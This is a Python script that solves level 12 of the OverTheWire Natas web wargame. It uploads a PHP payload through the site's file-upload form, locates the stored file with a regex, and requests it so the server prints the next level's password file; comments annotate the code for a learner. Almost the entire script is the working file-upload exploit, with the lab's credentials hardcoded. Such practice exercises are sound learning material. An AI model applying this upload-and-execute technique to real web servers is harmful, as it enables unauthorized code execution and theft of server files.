#!/usr/bin/env python
#inspired by https://github.com/andigena/natas/blob/master/natas12.py
import re
import requests
php_payload= r'''<?php
    include("/etc/natas_webpass/natas13");
?>'''
#need to comment!!!
files = {'uploadedfile':('file.php', php_payload)}
#important: params name uploaDEDfile !!!
#files is a dictionaries
data=dict(filename='file.php')
url='http://natas12.natas.labs.overthewire.org/'
#important: url ends with '/' !!!
#it's str
auth=('natas12','EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3')
r=requests.post(url, auth=auth, files=files, data=data)
#data={'key':'value'}
#files={'key':'value} key='uploadedfile' - from cite, value='file.php' - name ; 'php_payload' - content
uploaded_file=re.findall('''(upload/\S{10}.php)''', r.content)[0]
#re.findall(pattern, string, flags=0) return all non-overlapping matches of patern in string, as a list of string.
#\S{10} - '\S' non-witespace characters; {10} - lenght
#[0] - pointer to the first match of result reg.ex. search
# and if without [0] we get list with two elements
print 'Uploaded file: ', uploaded_file
r = requests.get(url + uploaded_file, auth=auth)
print r.content
